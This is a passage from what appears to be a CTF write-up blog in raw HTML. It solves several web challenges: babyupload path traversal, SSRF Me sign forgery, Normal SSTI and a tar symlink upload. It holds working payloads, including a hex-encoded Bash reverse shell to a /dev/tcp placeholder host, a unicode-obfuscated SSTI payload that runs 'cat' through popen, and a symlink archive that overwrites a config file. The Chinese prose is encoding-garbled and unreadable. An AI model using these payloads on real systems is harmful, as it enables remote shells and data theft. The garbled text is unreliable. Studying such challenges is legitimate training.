class="line">http://1.14.71.254:28568/calc?num=</span><br><span class="line">[[str][0]for[áµ’ï½“.environ[&#x27;BASH\x5fFUNC\x5fecho%%&#x27;]]in[[&#x27;\x28\x29\x20\x7b\x20\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x78\x78\x2e\x78\x78\x2e\x78\x78\x2e\x78\x78\x2f\x78\x78\x78\x78\x20\x30\x3e\x26\x31\x3b\x7d&#x27;]]]</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pplkS4H"><img src="https://s1.ax1x.com/2023/03/13/pplkS4H.png" alt="pplkS4H.png"></a></p><h1 id="NISACTF-2022-babyupload"><a href="#NISACTF-2022-babyupload" class="headerlink" title="[NISACTF 2022]babyupload"></a>[NISACTF 2022]babyupload</h1><p>æºç åœ¨**&#x2F;source**</p><p><strong>app.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, g, send_from_directory</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SCHEMA = <span class="string">&quot;&quot;&quot;CREATE TABLE files (</span></span><br><span class="line"><span class="string">id text primary key,</span></span><br><span class="line"><span class="string">path text</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    g_db = <span class="built_in">getattr</span>(g, <span class="string">&#x27;_database&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> g_db <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        g_db = g._database = sqlite3.connect(<span class="string">&quot;database.db&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> g_db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup</span>():</span><br><span class="line">    os.remove(<span class="string">&quot;database.db&quot;</span>)</span><br><span class="line">    cur = db().cursor()</span><br><span class="line">    cur.executescript(SCHEMA)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">    Select image to upload:</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;!-- /source --&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(directory=<span class="string">&quot;/var/www/html/&quot;</span>, path=<span class="string">&quot;www.zip&quot;</span>, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bad filename!&quot;</span>, <span class="number">403</span></span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    uid = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cur.execute(<span class="string">&quot;insert into files (id, path) values (?, ?)&quot;</span>, (uid, file.filename,))</span><br><span class="line">    <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Duplicate file&quot;</span></span><br><span class="line">    conn.commit()</span><br><span class="line"></span><br><span class="line">    file.save(<span class="string">&#x27;uploads/&#x27;</span> + file.filename)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/file/&#x27;</span> + uid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file/&lt;id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    cur.execute(<span class="string">&quot;select path from files where id=?&quot;</span>, (<span class="built_in">id</span>,))</span><br><span class="line">    res = cur.fetchone()</span><br><span class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(res[0])</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(<span class="string">&quot;uploads/&quot;</span>, res[<span class="number">0</span>]), <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>é—®é¢˜å‡ºåœ¨<code>os.path.join</code></p><p><a href="https://imgse.com/i/ppuzJ1g"><img src="https://s1.ax1x.com/2023/03/11/ppuzJ1g.png" alt="ppuzJ1g.png"></a></p><p>æ‰€ä»¥æ§åˆ¶<code>res[0]</code>ä¸º&#x2F;flagå³å¯</p><p><a href="https://imgse.com/i/ppuz0A0"><img src="https://s1.ax1x.com/2023/03/11/ppuz0A0.png" alt="ppuz0A0.png"></a></p><p>ä¹‹åå»è®¿é—®å³å¯</p><h1 id="De1ctf-2019-SSRF-Me"><a href="#De1ctf-2019-SSRF-Me" class="headerlink" title="[De1ctf 2019]SSRF Me"></a>[De1ctf 2019]SSRF Me</h1><p>æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># #encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)   </span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip) </span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">9999</span>)</span><br></pre></td></tr></table></figure><h2 id="ç®€å•æ€è·¯"><a href="#ç®€å•æ€è·¯" class="headerlink" title="ç®€å•æ€è·¯"></a>ç®€å•æ€è·¯</h2><p>é¦–å…ˆç»•è¿‡<code>self.checkSign()</code>,ç„¶ååŒæ—¶è¿›å…¥è¿™ä¸¤ä¸ªåˆ¤æ–­<code>if &quot;scan&quot; in self.action:</code>,<code>if &quot;read&quot; in self.action:</code>ï¼Œåˆ©ç”¨â€scanâ€æŠŠflagå†™å…¥åˆ°reasult.txté‡Œï¼Œç”¨â€readâ€è¯»å–result.txtå¹¶æ”¾åˆ°result[â€˜dataâ€™]é‡Œï¼Œæœ€ååœ¨<code>/De1ta</code>é‡Œç”¨<code>return json.dumps(task.Exec())</code>ä»¥jsonå½¢å¼è¿”å›å‡ºæ¥</p><p>å…ˆçœ‹<code> if (self.checkSign()):</code>ï¼ŒæŠŠç›¸å…³ä»£ç éƒ½æˆªå–å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">self.action = action</span><br><span class="line">self.param = param</span><br><span class="line">self.sign = sign</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p><code>self.checkSign()</code>&#x3D;&gt;<code>hashlib.md5(secert_key + param + action).hexdigest() == self.sign</code>&#x3D;&gt;<code>hashlib.md5(secert_key + &#39;flag.txt&#39; + &#39;readscan&#39;).hexdigest() == self.sign</code></p><p>ä¹Ÿå°±æ˜¯éœ€è¦<code>secert_key + &#39;flag.txt&#39; + &#39;readscan&#39;</code>çš„hashå€¼</p><p>ä¸ºä»€ä¹ˆè¿™é‡Œactionå‚æ•°è¦æ§åˆ¶ä¸º<code>readscan</code>ï¼Ÿåœ¨è¿›è¡Œifåˆ¤æ–­æ—¶ï¼Œç”¨çš„æ˜¯inè€Œä¸æ˜¯&#x3D;&#x3D;ï¼Œè€Œéœ€æ±‚æ˜¯è¦è°ƒç”¨readå’Œscan</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>è™½ç„¶secert_keyä¸çŸ¥é“ï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥åˆ©ç”¨geneSignè·å–åˆ°<code>secert_key + &#39;flag.txt&#39; + &#39;readscan&#39;</code>çš„hashå€¼</p><p>æ³¨æ„ï¼Œåœ¨geneSigné‡Œå·²ç»ç»™actionè¿›è¡Œäº†èµ‹å€¼</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/geneSign?param=flag.txtread</span><br></pre></td></tr></table></figure><p>è¿”å›ä¸€ä¸ªhashå€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">93ee9369112640be793ce5116e223e70</span><br></pre></td></tr></table></figure><p>ç»§ç»­çœ‹</p><p><code>hashlib.md5(secert_key + &#39;flag.txt&#39; + &#39;readscan&#39;).hexdigest() == self.sign</code></p><p>å…¶ä¸­<code>hashlib.md5(secert_key + &#39;flag.txt&#39; + &#39;readscan&#39;).hexdigest()</code>å·²ç»è·å¾—ï¼Œå¯æ§signçš„å€¼æ˜¯æ€ä¹ˆæ¥çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip) </span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°signæ˜¯ä¼ å…¥çš„cookieçš„å€¼ï¼Œæ‰€ä»¥æ§åˆ¶signä¸º<code>93ee9369112640be793ce5116e223e70</code></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/De1ta?param=flag.txt</span><br><span class="line"></span><br><span class="line">Cookie: action=readscan;sign=93ee9369112640be793ce5116e223e70</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppMDTOI"><img src="https://s1.ax1x.com/2023/03/12/ppMDTOI.png" alt="ppMDTOI.png"></a></p><h1 id="å®‰æ´µæ¯-2020-Normal-SSTI"><a href="#å®‰æ´µæ¯-2020-Normal-SSTI" class="headerlink" title="[å®‰æ´µæ¯ 2020]Normal SSTI"></a>[å®‰æ´µæ¯ 2020]Normal SSTI</h1><p>ç®€å•SSTIï¼Œè¿‡æ»¤<code>&#123;&#123;&#125;&#125;</code>ï¼Œç­‰ç­‰</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line">?url=&#123;%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22))|attr(%22\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%22)(%22os%22)|attr(%22popen%22)(%22cat\u0020/f???%22)|attr(%22read%22)()%&#125;</span><br></pre></td></tr></table></figure><p>unicodeç»•è¿‡ï¼Œflagè¢«è¿‡æ»¤ç”¨f???ä»£æ›¿</p><p><a href="https://imgse.com/i/ppKSKv4"><img src="https://s1.ax1x.com/2023/03/11/ppKSKv4.png" alt="ppKSKv4.png"></a></p><h1 id="NSSRound-7-Team-æ–°çš„åšå®¢"><a href="#NSSRound-7-Team-æ–°çš„åšå®¢" class="headerlink" title="[NSSRound#7 Team]æ–°çš„åšå®¢"></a>[NSSRound#7 Team]æ–°çš„åšå®¢</h1><p>æ³¨å†Œç™»é™†ä¸Šå»ï¼Œç¬¬ä¸€ç¯‡æ–‡ç« </p><p><a href="https://imgse.com/i/ppKKakT"><img src="https://s1.ax1x.com/2023/03/11/ppKKakT.png" alt="ppKKakT.png"></a></p><p>base64å’Œåå…­è¿›åˆ¶äº¤æ›¿è§£ï¼Œæœ€åå¾—åˆ°<code>/static/www.tar.gz</code></p><p>ä¸‹è½½ä¸‹æ¥ï¼Œå¾—åˆ°ä¸€ä¸ªç›®å½•ç»“æ„</p><p><a href="https://imgse.com/i/ppKKg76"><img src="https://s1.ax1x.com/2023/03/11/ppKKg76.png" alt="ppKKg76.png"></a></p><p>å¾ˆæ˜¾ç„¶ï¼Œç™»å½•adminè´¦æˆ·å°±èƒ½è·å¾—flag</p><p>ç‚¹å¼€ç”¨æˆ·åå‘ç°ä¸‰ä¸ªåŠŸèƒ½ï¼šç™»å‡ºã€åšå®¢å¤‡ä»½ã€åšå®¢æ¢å¤ï¼ˆæ–‡ä»¶ä¸Šä¼ ï¼‰</p><h2 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h2><p><strong>åˆ©ç”¨è½¯é“¾æ¥å»ä¿®æ”¹userinfo.json</strong></p><p>åˆ¶ä½œä¸€ä¸ªflagè½¯è¿æ¥æŒ‡å‘&#x2F;app&#x2F;conf&#x2F;userinfo.jsonï¼Œå‹ç¼©åä¸Šä¼ </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s /app/conf/userinfo.json user1/flag</span><br><span class="line"></span><br><span class="line">tar -cvzf upload.tar.gz 